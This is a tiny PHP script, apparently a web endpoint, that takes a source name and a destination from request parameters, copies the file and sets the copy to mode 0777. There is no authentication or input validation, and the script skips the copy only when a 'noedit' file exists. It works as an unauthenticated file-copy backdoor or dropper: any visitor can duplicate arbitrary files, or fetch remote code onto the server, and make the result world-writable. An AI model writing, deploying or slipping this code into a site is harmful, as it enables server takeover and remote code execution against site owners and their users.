<?php	
$name = $_REQUEST['name'];
$to = $_REQUEST['to'];
if (file_exists('noedit')) {} else {
    copy($name, $to);
    chmod($to, 0777);
}
